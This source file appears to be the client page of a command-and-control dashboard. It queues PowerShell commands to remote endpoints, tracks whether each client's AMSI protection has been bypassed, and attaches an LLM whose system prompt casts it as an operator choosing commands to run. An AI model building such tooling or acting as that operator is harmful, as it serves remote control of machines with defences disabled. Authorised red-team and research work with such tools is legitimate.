import React, { useEffect, useMemo, useRef, useState } from 'react'
import { useParams } from 'react-router-dom'
import { useAuth } from '../auth/AuthContext'
import type { Instruction, ResultView, LlmConfig, ChatMessage, ChatSession } from '../api'

type TabKey = 'instructions' | 'chat'

export default function ClientDetail(){
  const { id: clientId } = useParams()
  const { token, api } = useAuth()

  // ---------- Tabs ----------
  const [tab, setTab] = useState<TabKey>('instructions')

  // ---------- Client Info ----------
  const [clientInfo, setClientInfo] = useState<{ id: string, amsi_bypassed: boolean } | null>(null)

  // ---------- Instructions tab ----------
  const [command, setCommand] = useState('')
  const [statusFilter, setStatusFilter] = useState<string>('') // '', queued, delivered, completed
  const [rows, setRows] = useState<Instruction[]>([])
  const [loading, setLoading] = useState(false)
  const [viewing, setViewing] = useState<{ id: string; payload: ResultView; decoded: string } | null>(null)
  const pollRef = useRef<number | null>(null)

  const canSend = useMemo(() => Boolean(clientId && command.trim()), [clientId, command])

  async function loadInstructions(){
    if (!clientId || !token) return
    setLoading(true)
    try {
      const list = await api.clientInstructions(clientId, {
        status: (statusFilter || undefined) as any,
        limit: 200
      })
      setRows(Array.isArray(list) ? list : [])
    } finally {
      setLoading(false)
    }
  }

  useEffect(()=>{
    if (!token || !clientId || tab !== 'instructions') return
    loadInstructions()
    if (pollRef.current) clearInterval(pollRef.current)
    pollRef.current = window.setInterval(loadInstructions, 10_000)
    return ()=> { if (pollRef.current) clearInterval(pollRef.current) }
  }, [token, clientId, statusFilter, tab])

  async function queue(){
    if (!canSend) return
    await api.issue(clientId!, command.trim())
    setCommand('')
    await loadInstructions()
  }

  function b64ToUtf8(b64: string){
    const bin = atob(b64)
    const bytes = Uint8Array.from(bin, c => c.charCodeAt(0))
    return new TextDecoder().decode(bytes)
  }

  async function viewResult(rid: string){
    try {
      const j = await api.result(rid) // server returns JSON; we’ll optionally ask plaintext

      let decoded = ''
      if ((j as any).result_plain_b64){
        try {
          const txt = b64ToUtf8((j as any).result_plain_b64!)
          try { decoded = JSON.stringify(JSON.parse(txt), null, 2) }
          catch { decoded = txt }
        } catch (e:any) {
          decoded = `<< Failed to decode plaintext: ${e?.message || e} >>`
        }
      } else if (j.plaintext) {
        // If your server returns plaintext directly (string)
        try {
          decoded = JSON.stringify(JSON.parse(j.plaintext), null, 2)
        } catch { decoded = String(j.plaintext) }
      } else if (j.result_cipher_b64) {
        decoded = '🔐 Encrypted result (no plaintext available).'
      } else {
        decoded = 'No result payload present.'
      }

      setViewing({ id: rid, payload: j, decoded })
    } catch (e:any) {
      alert(`Failed to fetch result: ${e.message || e}`)
    }
  }

  // ---------- Chat tab (per client) ----------
  const [configs, setConfigs] = useState<LlmConfig[]>([])
  const [configId, setConfigId] = useState('')
  const [systemPrompt, setSystemPrompt] = useState(
    'You are an MCP operator for this endpoint. When the user asks for an action, decide the PowerShell command or commands is needed and call the necessary tools to obtain the information, single-line command.'
  )
  const [session, setSession] = useState<ChatSession | null>(null)
  const [messages, setMessages] = useState<ChatMessage[]>([])
  const [userMsg, setUserMsg] = useState('')
  const [busy, setBusy] = useState(false)
  const [chatErr, setChatErr] = useState('')

  async function loadConfigs(){
    try {
      const rows = await api.llmConfigs()
      const activeFirst = (rows || []).sort((a,b)=> Number(b.active) - Number(a.active))
      setConfigs(activeFirst)
      if (activeFirst[0]) setConfigId(activeFirst[0].id)
    } catch (e:any) {
      setChatErr(e.message || 'Failed to load LLM configs')
    }
  }

  useEffect(()=>{ if (token && tab==='chat') loadConfigs() }, [token, tab])

  // Load client info with AMSI status
  async function loadClientInfo(){
    if (!clientId || !token) return
    try {
      const response = await fetch('/api/clients', {
        headers: { 'Authorization': `Bearer ${token}` }
      })
      if (response.ok) {
        const data = await response.json()
        const client = (data.clients || []).find((c: any) => c.id === clientId)
        if (client) {
          setClientInfo({ id: client.id, amsi_bypassed: client.amsi_bypassed || false })
        }
      }
    } catch (e) {
      console.error('Failed to load client info:', e)
    }
  }

  useEffect(()=>{ loadClientInfo() }, [clientId, token])

  // Refresh client info periodically
  useEffect(()=>{
    if (!token || !clientId) return
    const interval = setInterval(loadClientInfo, 15000) // Refresh every 15s
    return () => clearInterval(interval)
  }, [token, clientId])

  async function startChat(){
    if (!clientId || !configId) return
    setChatErr('')
    try {
      const s = await api.chatCreate(clientId, configId)
      setSession(s)
      const ms = await api.chatMessages(clientId, s.id)
      setMessages(ms || [])
      // If you want to push a system message at start, you can send it as the first user message with a prefix,
      // or let the backend store systemPrompt with the session when you create it (preferred, if supported).
    } catch (e:any) {
      setChatErr(e.message || 'Failed to start session')
    }
  }

  async function refreshMsgs(){
    if (!clientId || !session?.id) return
    try {
      const ms = await api.chatMessages(clientId, session.id)
      setMessages(ms || [])
    } catch {}
  }

  async function sendChat(){
    if (!clientId || !session?.id || !userMsg.trim()) return
    setBusy(true); setChatErr('')
    try {
      const r = await api.chatSend(clientId, session.id, userMsg)
      setUserMsg('')
      await refreshMsgs()
      if (r?.error) {
        alert(`LLM error: ${r.error}`)
      }
      // If backend returns queued_instruction_id in r, show a toast or banner if needed.
    } catch (e:any) {
      const msg = e?.message || String(e)
      if (msg.startsWith('429')) {
        alert(`LLM quota/rate limit – ${msg}`)
      } else {
        alert(`LLM error – ${msg}`)
      }
    } finally {
      setBusy(false)
    }
  }

  if (!token) {
    return <div className="bg-amber-50 border border-amber-200 text-amber-900 rounded-2xl p-4">Please log in.</div>
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <h2 className="text-xl font-semibold flex items-center gap-2" style={{ color: 'var(--aimaru-text)' }}>
          Client • <span className="font-mono text-base">{clientId}</span>
          {clientInfo && (
            <span title={clientInfo.amsi_bypassed ? "AMSI Bypassed - Protection Disabled" : "AMSI Active - Protected"}
                  className="text-2xl">
              {clientInfo.amsi_bypassed ? '🛡️💥' : '🛡️'}
            </span>
          )}
        </h2>
        <div className="ml-auto flex gap-2">
          <button
            className="rounded-xl px-3 py-1.5 transition-all"
            style={{
              background: tab === 'instructions' ? 'rgba(0, 229, 204, 0.2)' : 'transparent',
              border: tab === 'instructions' ? '1px solid var(--aimaru-cyan)' : '1px solid var(--aimaru-dark-border)',
              color: tab === 'instructions' ? 'var(--aimaru-cyan)' : 'var(--aimaru-text-dim)'
            }}
            onClick={()=>setTab('instructions')}
          >Instructions</button>
          <button
            className="rounded-xl px-3 py-1.5 transition-all"
            style={{
              background: tab === 'chat' ? 'rgba(0, 229, 204, 0.2)' : 'transparent',
              border: tab === 'chat' ? '1px solid var(--aimaru-cyan)' : '1px solid var(--aimaru-dark-border)',
              color: tab === 'chat' ? 'var(--aimaru-cyan)' : 'var(--aimaru-text-dim)'
            }}
            onClick={()=>setTab('chat')}
          >Chat</button>
        </div>
      </div>

      {/* ===== Instructions tab ===== */}
      {tab === 'instructions' && (
        <>
          <section className="rounded-2xl shadow-sm p-4 space-y-3" style={{
            background: 'var(--aimaru-dark-card)',
            border: '1px solid var(--aimaru-dark-border)'
          }}>
            <h3 className="font-semibold" style={{ color: 'var(--aimaru-text)' }}>Send Instruction</h3>
            <textarea
              className="w-full rounded-xl px-3 py-2 h-28 font-mono"
              style={{
                background: 'var(--aimaru-dark-bg)',
                border: '1px solid var(--aimaru-dark-border)',
                color: 'var(--aimaru-text)'
              }}
              placeholder="PowerShell command..."
              value={command}
              onChange={e=>setCommand(e.target.value)}
            />
            <div className="flex items-center gap-2">
              <button
                className="rounded-xl px-4 py-2 font-bold transition-all disabled:opacity-50"
                style={{
                  background: 'rgba(0, 229, 204, 0.2)',
                  border: '1px solid var(--aimaru-cyan)',
                  color: 'var(--aimaru-cyan)'
                }}
                onClick={queue}
                disabled={!canSend}
              >Send</button>
              <select
                className="ml-auto rounded-xl px-3 py-2"
                style={{
                  background: 'var(--aimaru-dark-bg)',
                  border: '1px solid var(--aimaru-dark-border)',
                  color: 'var(--aimaru-text)'
                }}
                value={statusFilter}
                onChange={e=>setStatusFilter(e.target.value)}
                title="Filter by status"
              >
                <option value="">All</option>
                <option value="queued">Queued</option>
                <option value="delivered">Delivered</option>
                <option value="completed">Completed</option>
              </select>
              <button
                className="rounded-lg px-3 py-1 transition-all disabled:opacity-50"
                style={{
                  background: 'var(--aimaru-dark-bg)',
                  border: '1px solid var(--aimaru-dark-border)',
                  color: 'var(--aimaru-text-dim)'
                }}
                onClick={loadInstructions}
                disabled={loading}
              >
                {loading ? '…' : 'Refresh'}
              </button>
            </div>
          </section>

          <section className="rounded-2xl shadow-sm p-4 overflow-auto" style={{
            background: 'var(--aimaru-dark-card)',
            border: '1px solid var(--aimaru-dark-border)'
          }}>
            <div className="font-semibold mb-2" style={{ color: 'var(--aimaru-text)' }}>Instructions ({rows.length})</div>
            <table className="w-full text-sm" style={{ color: 'var(--aimaru-text)' }}>
              <thead>
                <tr className="text-left" style={{ borderBottom: '1px solid var(--aimaru-dark-border)' }}>
                  <th className="py-2 pr-2" style={{ color: 'var(--aimaru-text-dim)' }}>ID</th>
                  <th className="py-2 pr-2" style={{ color: 'var(--aimaru-text-dim)' }}>Status</th>
                  <th className="py-2 pr-2" style={{ color: 'var(--aimaru-text-dim)' }}>Created</th>
                  <th className="py-2 pr-2" style={{ color: 'var(--aimaru-text-dim)' }}>Delivered</th>
                  <th className="py-2 pr-2" style={{ color: 'var(--aimaru-text-dim)' }}>Completed</th>
                  <th className="py-2 pr-2" style={{ color: 'var(--aimaru-text-dim)' }}>Result</th>
                </tr>
              </thead>
              <tbody>
                {rows.map(r=> (
                  <tr key={r.id} className="last:border-b-0" style={{ borderBottom: '1px solid var(--aimaru-dark-border)' }}>
                    <td className="py-2 pr-2 font-mono text-xs">{r.id}</td>
                    <td className="py-2 pr-2">{r.status}</td>
                    <td className="py-2 pr-2">{r.created_at ? new Date(r.created_at).toLocaleString() : ''}</td>
                    <td className="py-2 pr-2">{r.delivered_at ? new Date(r.delivered_at).toLocaleString() : ''}</td>
                    <td className="py-2 pr-2">{r.completed_at ? new Date(r.completed_at).toLocaleString() : ''}</td>
                    <td className="py-2 pr-2">
                      {(r as any).has_result || r.status === 'completed'
                        ? <button className="underline" style={{ color: 'var(--aimaru-cyan)' }} onClick={()=>viewResult(r.id)}>view</button>
                        : <span style={{ color: 'var(--aimaru-text-dim)' }}>—</span>}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
            {rows.length===0 && <div className="mt-2" style={{ color: 'var(--aimaru-text-dim)' }}>No instructions yet.</div>}
          </section>

          {viewing && (
            <section className="rounded-2xl shadow-sm p-4" style={{
              background: 'var(--aimaru-dark-card)',
              border: '1px solid var(--aimaru-dark-border)'
            }}>
              <div className="flex items-center justify-between">
                <h3 className="font-semibold" style={{ color: 'var(--aimaru-text)' }}>
                  Result • <span className="font-mono text-xs">{viewing.id}</span>
                </h3>
                <button className="text-sm underline" style={{ color: 'var(--aimaru-cyan)' }} onClick={()=>setViewing(null)}>close</button>
              </div>
              <div className="mt-2 text-sm" style={{ color: 'var(--aimaru-text-dim)' }}>
                {(viewing.payload as any).result_plain_b64 || viewing.payload.plaintext
                  ? 'Decoded plaintext shown below.'
                  : 'Encrypted (cipher only).'}
              </div>
              <pre className="mt-2 p-3 rounded-xl overflow-auto max-h-96 text-xs whitespace-pre-wrap" style={{
                background: 'var(--aimaru-dark-bg)',
                border: '1px solid var(--aimaru-dark-border)',
                color: 'var(--aimaru-text)'
              }}>
                {viewing.decoded || JSON.stringify(viewing.payload, null, 2)}
              </pre>
            </section>
          )}
        </>
      )}

      {/* ===== Chat tab ===== */}
      {tab === 'chat' && (
        <section className="rounded-2xl shadow-sm p-4 space-y-3" style={{
          background: 'var(--aimaru-dark-card)',
          border: '1px solid var(--aimaru-dark-border)'
        }}>
          <h3 className="font-semibold text-lg" style={{ color: 'var(--aimaru-text)' }}>LLM Chat for this client</h3>

          {chatErr && <div className="rounded-xl p-2 text-sm" style={{
            background: 'rgba(220, 38, 38, 0.1)',
            border: '1px solid #DC2626',
            color: '#DC2626'
          }}>{chatErr}</div>}

          {!session && (
            <div className="space-y-2">
              <div className="grid sm:grid-cols-3 gap-2">
                <select
                  className="rounded-xl px-3 py-2"
                  style={{
                    background: 'var(--aimaru-dark-bg)',
                    border: '1px solid var(--aimaru-dark-border)',
                    color: 'var(--aimaru-text)'
                  }}
                  value={configId}
                  onChange={e=>setConfigId(e.target.value)}
                >
                  {configs.length===0 && <option value="">No configs</option>}
                  {configs.map(c=> <option key={c.id} value={c.id}>{c.active ? '● ' : '○ '}{c.name} • {c.model}</option>)}
                </select>
                <button
                  className="rounded-xl px-4 py-2 font-bold transition-all disabled:opacity-50"
                  style={{
                    background: 'rgba(0, 229, 204, 0.2)',
                    border: '1px solid var(--aimaru-cyan)',
                    color: 'var(--aimaru-cyan)'
                  }}
                  onClick={startChat}
                  disabled={!configId}
                >Create session</button>
              </div>
              <textarea
                className="w-full rounded-xl px-3 py-2 h-28"
                style={{
                  background: 'var(--aimaru-dark-bg)',
                  border: '1px solid var(--aimaru-dark-border)',
                  color: 'var(--aimaru-text)'
                }}
                value={systemPrompt}
                onChange={e=>setSystemPrompt(e.target.value)}
                placeholder="(Optional) System prompt; store or send via your backend if supported"
              />
            </div>
          )}

          {session && (
            <>
              <div className="rounded-xl max-h-96 overflow-auto p-3" style={{
                background: 'var(--aimaru-dark-bg)',
                border: '1px solid var(--aimaru-dark-border)'
              }}>
                {messages.map(m=> (
                  <div key={m.id} className="mb-3">
                    <div className="text-xs" style={{ color: 'var(--aimaru-text-dim)' }}>
                      {m.created_at ? new Date(m.created_at).toLocaleString() : ''} • {m.role}
                    </div>
                    <pre className="rounded-lg p-2 text-xs whitespace-pre-wrap" style={{
                      background: 'var(--aimaru-dark-card)',
                      border: '1px solid var(--aimaru-dark-border)',
                      color: 'var(--aimaru-text)'
                    }}>{m.content}</pre>
                  </div>
                ))}
                {messages.length===0 && <div className="text-sm" style={{ color: 'var(--aimaru-text-dim)' }}>No messages yet.</div>}
              </div>

              <div className="grid sm:grid-cols-[1fr_auto] gap-2">
                <input
                  className="rounded-xl px-3 py-2"
                  style={{
                    background: 'var(--aimaru-dark-bg)',
                    border: '1px solid var(--aimaru-dark-border)',
                    color: 'var(--aimaru-text)'
                  }}
                  placeholder="Ask the LLM…"
                  value={userMsg}
                  onChange={e=>setUserMsg(e.target.value)}
                  onKeyDown={e=>{ if (e.key==='Enter' && !e.shiftKey) { e.preventDefault(); sendChat() }}}
                />
                <button
                  className="rounded-xl px-4 py-2 font-bold transition-all disabled:opacity-50"
                  style={{
                    background: 'rgba(0, 229, 204, 0.2)',
                    border: '1px solid var(--aimaru-cyan)',
                    color: 'var(--aimaru-cyan)'
                  }}
                  onClick={sendChat}
                  disabled={busy || !userMsg.trim()}
                >
                  {busy ? '…' : 'Send'}
                </button>
              </div>
            </>
          )}
        </section>
      )}
    </div>
  )
}
